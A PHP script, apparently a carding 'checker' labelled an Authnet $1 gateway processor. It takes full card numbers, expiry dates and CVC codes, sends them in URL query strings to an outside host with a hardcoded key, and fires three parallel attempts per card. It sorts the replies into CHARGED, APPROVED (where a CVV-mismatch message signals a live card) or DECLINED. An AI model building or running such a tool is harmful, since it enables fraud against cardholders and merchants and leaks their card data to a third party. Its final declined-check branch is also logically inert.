<?php

require_once __DIR__ . '/validkey.php';
validateApiKey();

// authnet1$.php - Authnet 1$ Gateway Processor

// Disable error reporting for production
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// Check if POST data is available
if (!isset($_POST['card']['number'], $_POST['card']['exp_month'], $_POST['card']['exp_year'], $_POST['card']['cvc'])) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card parameters']);
    exit;
}

// Extract card details
$card_number = $_POST['card']['number'];
$exp_month = str_pad($_POST['card']['exp_month'], 2, '0', STR_PAD_LEFT); // Ensure MM format
$exp_year = $_POST['card']['exp_year'];
$cvc = $_POST['card']['cvc'];

// Normalize exp_year to 4 digits if it's 2 digits (YY)
if (strlen($exp_year) === 2) {
    $exp_year = (intval($exp_year) < 50 ? '20' : '19') . $exp_year;
} elseif (strlen($exp_year) !== 4 || !is_numeric($exp_year)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid year format']);
    exit;
}

// Format cc string: number|month|year|cvc
$cc = $card_number . '|' . $exp_month . '|' . $exp_year . '|' . $cvc;

// API URL
$api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';

// Function to make parallel API request
function makeRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    return $error ? false : $response;
}

// Create 3 parallel requests with slight variations (e.g., adding random delay to simulate different attempts)
$responses = [];
$multi_handle = curl_multi_init();

$channels = [];
for ($i = 0; $i < 3; $i++) {
    $url = $api_url_base . urlencode($cc) . '&attempt=' . $i . '&rand=' . mt_rand();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_multi_add_handle($multi_handle, $ch);
    $channels[$i] = $ch;
}

$active = null;
do {
    curl_multi_exec($multi_handle, $active);
    usleep(10000); // Small delay to prevent CPU overload
} while ($active > 0);

foreach ($channels as $i => $ch) {
    $response = curl_multi_getcontent($ch);
    if ($response !== false) {
        $responses[$i] = $response;
    }
    curl_multi_remove_handle($multi_handle, $ch);
}
curl_multi_close($multi_handle);

// Process responses
$best_response = ['status' => 'DECLINED', 'message' => 'All attempts failed'];
foreach ($responses as $response) {
    if ($response !== false) {
        $data = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($data['message'], $data['status'])) {
            $best_response = $data;
            break; // Take the first valid response
        }
    }
}

if (json_last_error() !== JSON_ERROR_NONE) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid API response']);
    exit;
}

// Extract message and status
$message = $best_response['message'] ?? 'Unknown error';
$api_status = $best_response['status'] ?? 'UNKNOWN';

// Lowercase for case-insensitive comparison
$message_lower = strtolower($message);

// Define phrase arrays
$charged_phrases = [
    'transaction approved',
    'payment successful',
    'transaction complete',
    'approved',
    'success',
    'payment processed',
    'thank you for your payment'
];

$approved_phrases = [
    'cvv',
    'card code',
    'security code',
    'cvv2',
    'cvc',
    'cvv does not match',
    'security code'
];

$declined_phrases = [
    'failed',
    'declined',
    'transaction declined',
    'card declined',
    'insufficient funds',
    'invalid card',
    'expired card',
    'this transaction has been declined'
];

// Determine status
$our_status = 'DECLINED';

// Check for CHARGED
foreach ($charged_phrases as $phrase) {
    if (strpos($message_lower, $phrase) !== false) {
        $our_status = 'CHARGED';
        break;
    }
}

// If not CHARGED, check for APPROVED (CVV related)
if ($our_status === 'DECLINED') {
    foreach ($approved_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $our_status = 'APPROVED';
            break;
        }
    }
}

// If still DECLINED, confirm with declined phrases or default
if ($our_status === 'DECLINED') {
    $is_declined = false;
    foreach ($declined_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $is_declined = true;
            break;
        }
    }
    if (!$is_declined && $api_status !== 'DECLINED') {
        $our_status = 'DECLINED';
    }
}

// Prepare output message
$our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');

// Output JSON response
echo json_encode(['status' => $our_status, 'message' => $our_message]);
?>
